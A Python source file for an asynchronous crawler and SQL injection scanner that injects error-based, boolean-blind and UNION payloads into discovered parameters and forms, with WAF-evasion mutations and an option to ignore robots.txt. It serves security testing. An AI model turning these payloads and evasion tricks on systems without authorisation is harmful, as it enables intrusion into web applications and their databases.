#!/usr/bin/env python3
"""
async_sqli_scanner.py
Async crawler + generic SQLi scanner (SQLite/PDO-friendly, MySQL-compatible).

Features:
- Async crawl of same-domain pages with depth control
- Discover GET parameters (and auto-enqueue forms for coverage)
- Test error-based and boolean-based SQLi (string and numeric contexts)
- Simple WAF-evasion (inline comments, case toggling)
- Concurrency with asyncio semaphores
- JSON, CSV, and latest_scan.json output

Usage:
    python app.py --start-url http://localhost:8000 --max-depth 2 --concurrency 10
"""

import asyncio, aiohttp, argparse, json, csv, random, re, time, glob, os, difflib
from urllib.parse import urlparse, urljoin, parse_qs
from urllib import robotparser

# -------------------------
# Config
# -------------------------
DEFAULT_UA = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/114.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0 Safari/605.1.15"
]

PAYLOADS = {
    # Basic break-out / syntax error triggers
    "error": ["'", '"', "')", '" )'],
    # Boolean for numeric context
    "boolean_num_true": [" AND 1=1 -- "],
    "boolean_num_false": [" AND 1=2 -- "],
    # Boolean for string context (close quote first)
    "boolean_str_true": ["' OR '1'='1' -- "],
    "boolean_str_false": ["' OR '1'='2' -- "],
    # Union (best-effort, may not match columns)
    "union": [" UNION SELECT 1 -- ", " UNION SELECT 1,2 -- ", " UNION SELECT 1,2,3 -- "]
}

SQL_ERRORS = [
    # SQLite/PDO style
    re.compile(r"SQLSTATE\[[A-Z0-9]+\]", re.I),
    re.compile(r"near \".*\": syntax error", re.I),
    re.compile(r"no such column", re.I),
    re.compile(r"unrecognized token", re.I),
    re.compile(r"unterminated (?:quoted )?string", re.I),
    # MySQL style (keep for compatibility)
    re.compile(r"You have an error in your SQL syntax", re.I),
    re.compile(r"mysql_", re.I)
]

# -------------------------
# Payload mutation
# -------------------------
def mutate_payload(payload):
    muts = [payload, payload.replace("UNION", "UN/**/ION").replace("union","un/**/ion")]
    muts.append(''.join([c.upper() if i%2==0 else c for i,c in enumerate(payload)]))
    return list(dict.fromkeys(muts))

# -------------------------
# Scanner class
# -------------------------
class AsyncSQLiScanner:
    def __init__(self, start_url, max_depth=2, concurrency=5, delay=0.3, timeout=10, user_agents=None,
                 max_retries=2, backoff_base=0.4, respect_robots=True, verbose=True, quiet=False):
        self.start_url = start_url.rstrip('/')
        self.domain = urlparse(start_url).netloc
        self.scheme = urlparse(start_url).scheme
        self.max_depth = max_depth
        self.visited = set()
        self.to_visit = [(start_url, 0)]
        self.semaphore = asyncio.Semaphore(concurrency)
        self.delay = delay
        self.timeout = timeout
        self.user_agents = user_agents or DEFAULT_UA
        self.results = []
        self.form_targets = []  # accumulate discovered forms with params
        self._seen_findings = set()  # for de-duplication
        self.max_retries = max_retries
        self.backoff_base = backoff_base
        self.respect_robots = respect_robots
        self._robots = None  # robotparser.RobotFileParser or None
        self.verbose = verbose and not quiet
        self.quiet = quiet

    def _log(self, msg):
        if self.verbose and not self.quiet:
            print(msg)

    async def fetch(self, session, url, method="GET", data=None):
        headers = {"User-Agent": random.choice(self.user_agents)}
        attempt = 0
        while True:
            try:
                async with self.semaphore:
                    if method.upper() == "GET":
                        async with session.get(url, headers=headers, params=(data or None), timeout=self.timeout) as resp:
                            text = await resp.text()
                            # retry on 429 or 5xx
                            if resp.status in (429,) or 500 <= resp.status < 600:
                                raise aiohttp.ClientResponseError(request_info=resp.request_info, history=resp.history, status=resp.status, message="retryable status")
                            return resp.status, text
                    else:
                        async with session.post(url, headers=headers, data=data, timeout=self.timeout) as resp:
                            text = await resp.text()
                            if resp.status in (429,) or 500 <= resp.status < 600:
                                raise aiohttp.ClientResponseError(request_info=resp.request_info, history=resp.history, status=resp.status, message="retryable status")
                            return resp.status, text
            except Exception:
                if attempt >= self.max_retries:
                    return None, ""
                # exponential backoff with jitter
                sleep_for = self.backoff_base * (2 ** attempt) + random.uniform(0, 0.2)
                await asyncio.sleep(sleep_for)
                attempt += 1

    async def crawl(self):
        async with aiohttp.ClientSession() as session:
            # load robots.txt once if enabled
            if self.respect_robots:
                await self._load_robots(session)
            while self.to_visit:
                url, depth = self.to_visit.pop(0)
                if url in self.visited or depth > self.max_depth:
                    continue
                if self.respect_robots and not self._can_fetch(url):
                    self._log(f"[robots] Disallowed: {url}")
                    continue
                self.visited.add(url)
                status, text = await self.fetch(session, url)
                await asyncio.sleep(self.delay)
                if text:
                    await self.extract_links_forms(session, text, url, depth)

    async def _load_robots(self, session):
        try:
            rp = robotparser.RobotFileParser()
            robots_url = f"{self.scheme}://{self.domain}/robots.txt"
            _, txt = await self.fetch(session, robots_url, method="GET")
            if txt:
                rp.parse(txt.splitlines())
                self._robots = rp
                self._log(f"[robots] Loaded robots.txt from {robots_url}")
        except Exception:
            self._robots = None

    def _can_fetch(self, url):
        if not self._robots:
            return True
        try:
            return self._robots.can_fetch("AsyncSQLiScanner", url)
        except Exception:
            return True

    async def extract_links_forms(self, session, html, base_url, depth):
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(html, "html.parser")
        # A tags
        for a in soup.find_all('a', href=True):
            href = a['href']
            if href.startswith('javascript:') or href.startswith('mailto:'):
                continue
            absolute = urljoin(base_url, href)
            parsed = urlparse(absolute)
            if parsed.netloc == self.domain:
                normalized = parsed._replace(fragment='').geturl()
                if normalized not in self.visited and (not self.respect_robots or self._can_fetch(normalized)):
                    self.to_visit.append((normalized, depth+1))
        # forms
        for form in soup.find_all('form'):
            action = form.get('action') or base_url
            method = (form.get('method') or "get").upper()
            absolute = urljoin(base_url, action)
            inputs = {}
            for inp in form.find_all(['input','textarea','select']):
                name = inp.get('name')
                if name:
                    inputs[name] = inp.get('value') or 'test'
            # store as target for scanning
            if (not self.respect_robots) or self._can_fetch(absolute):
                self.form_targets.append({"type": method, "url": absolute, "params": inputs})
            if absolute not in self.visited and (not self.respect_robots or self._can_fetch(absolute)):
                self.to_visit.append((absolute, depth+1))

    async def discover_targets(self):
        targets = []
        for url in self.visited:
            parsed = urlparse(url)
            qs = parsed.query
            if qs:
                params = {k:v[0] if isinstance(v,list) else v for k,v in parse_qs(qs).items()}
                clean_url = parsed._replace(query='').geturl()
                targets.append({"type":"GET","url":clean_url,"params":params})
        # include discovered HTML form targets
        # avoid duplicates by a simple set of tuples
        seen = set()
        out = []
        for t in targets + self.form_targets:
            key = (t['type'], t['url'], tuple(sorted(t['params'].items())))
            if key not in seen:
                seen.add(key)
                out.append(t)
        return out

    async def test_target(self, session, target):
        base_type = target['type']
        base_url = target['url']
        params = target['params'].copy()
        status, baseline_text = await self.fetch(session, base_url, method=base_type, data=params)
        baseline_len = len(baseline_text)

        def record(tech, param, payload, evidence=""):
            key = (base_url, base_type, param, tech, payload)
            if key in self._seen_findings:
                return
            self._seen_findings.add(key)
            entry = {"url": base_url,"type":base_type,"param":param,"technique":tech,"payload":payload,"evidence":evidence}
            self.results.append(entry)
            if not self.quiet:
                print(f"[!] VULN {tech}: {base_url} param={param} payload={payload}")

        def differ(a, b, len_threshold=0.02, ratio_threshold=0.90):
            # consider different if either size delta is significant or similarity ratio is low
            if not a or not b:
                return False
            if abs(len(a) - len(b)) > max(50, len_threshold * max(len(a), len(b))):
                return True
            try:
                ratio = difflib.SequenceMatcher(None, a, b).quick_ratio()
                return ratio < ratio_threshold
            except Exception:
                return False

        # Error-based
        for p in list(params.keys()):
            original = params[p]
            for pay in PAYLOADS['error']:
                for mp in mutate_payload(pay):
                    params[p] = original + mp
                    _, txt = await self.fetch(session, base_url, method=base_type, data=params)
                    for pat in SQL_ERRORS:
                        if pat.search(txt):
                            record("error-based", p, mp, pat.pattern)
                    params[p] = original

        # Boolean-based (blind) — try numeric and string context variants with diff ratio
        for p in list(params.keys()):
            orig = params[p]
            # numeric
            t_payload = mutate_payload(PAYLOADS['boolean_num_true'][0])[0]
            f_payload = mutate_payload(PAYLOADS['boolean_num_false'][0])[0]
            params[p] = orig + t_payload
            _, t_resp = await self.fetch(session, base_url, method=base_type, data=params)
            params[p] = orig + f_payload
            _, f_resp = await self.fetch(session, base_url, method=base_type, data=params)
            params[p] = orig
            if differ(t_resp, f_resp):
                sim = difflib.SequenceMatcher(None, t_resp, f_resp).quick_ratio() if t_resp and f_resp else 0.0
                record("boolean-blind", p, f"{t_payload}/{f_payload}", evidence=f"sim={sim:.3f} len_t={len(t_resp)} len_f={len(f_resp)}")

            # string
            st_payload = mutate_payload(PAYLOADS['boolean_str_true'][0])[0]
            sf_payload = mutate_payload(PAYLOADS['boolean_str_false'][0])[0]
            params[p] = orig + st_payload
            _, st_resp = await self.fetch(session, base_url, method=base_type, data=params)
            params[p] = orig + sf_payload
            _, sf_resp = await self.fetch(session, base_url, method=base_type, data=params)
            params[p] = orig
            if differ(st_resp, sf_resp):
                sim = difflib.SequenceMatcher(None, st_resp, sf_resp).quick_ratio() if st_resp and sf_resp else 0.0
                record("boolean-blind", p, f"{st_payload}/{sf_payload}", evidence=f"sim={sim:.3f} len_t={len(st_resp)} len_f={len(sf_resp)}")

        # Time-based tests are skipped for SQLite (no built-in SLEEP); could be added with heavy functions but omitted by default.

    async def run(self):
        async with aiohttp.ClientSession() as session:
            await self.crawl()
            targets = await self.discover_targets()
            if not self.quiet:
                print(f"[+] {len(targets)} targets discovered")
            tasks = [self.test_target(session, t) for t in targets]
            await asyncio.gather(*tasks)

    def export_results(self, prefix="scan"):
        ts = int(time.time())
        json_path = f"{prefix}_{ts}.json"
        csv_path = f"{prefix}_{ts}.csv"
        with open(json_path,"w",encoding="utf-8") as f:
            json.dump(self.results,f,indent=2)
        keys = ["url","type","param","technique","payload","evidence"]
        with open(csv_path,"w",newline='',encoding="utf-8") as f:
            writer = csv.DictWriter(f,fieldnames=keys)
            writer.writeheader()
            for row in self.results:
                writer.writerow({k: row.get(k,"") for k in keys})
        # Also write/refresh a stable filename for dashboards
        try:
            with open("latest_scan.json","w",encoding="utf-8") as f:
                json.dump(self.results,f,indent=2)
        except Exception:
            pass
        print(f"[+] Exported {json_path}, {csv_path}, and latest_scan.json")

# -------------------------
# CLI
# -------------------------
def parse_args():
    ap = argparse.ArgumentParser(description="Async crawler + SQLi scanner")
    ap.add_argument("--start-url", "-u", required=True)
    ap.add_argument("--max-depth", type=int, default=2)
    ap.add_argument("--concurrency", type=int, default=5)
    ap.add_argument("--delay", type=float, default=0.3)
    ap.add_argument("--timeout", type=float, default=10)
    ap.add_argument("--retries", type=int, default=2)
    ap.add_argument("--backoff", type=float, default=0.4)
    ap.add_argument("--no-robots", action="store_true", help="Ignore robots.txt")
    g = ap.add_mutually_exclusive_group()
    g.add_argument("--quiet", action="store_true")
    g.add_argument("--verbose", action="store_true")
    return ap.parse_args()

if __name__=="__main__":
    args = parse_args()
    scanner = AsyncSQLiScanner(
        start_url=args.start_url,
        max_depth=args.max_depth,
        concurrency=args.concurrency,
        delay=args.delay,
        timeout=args.timeout,
        max_retries=args.retries,
        backoff_base=args.backoff,
        respect_robots=(not args.no_robots),
        verbose=args.verbose and not args.quiet,
        quiet=args.quiet,
    )
    asyncio.run(scanner.run())
    scanner.export_results()
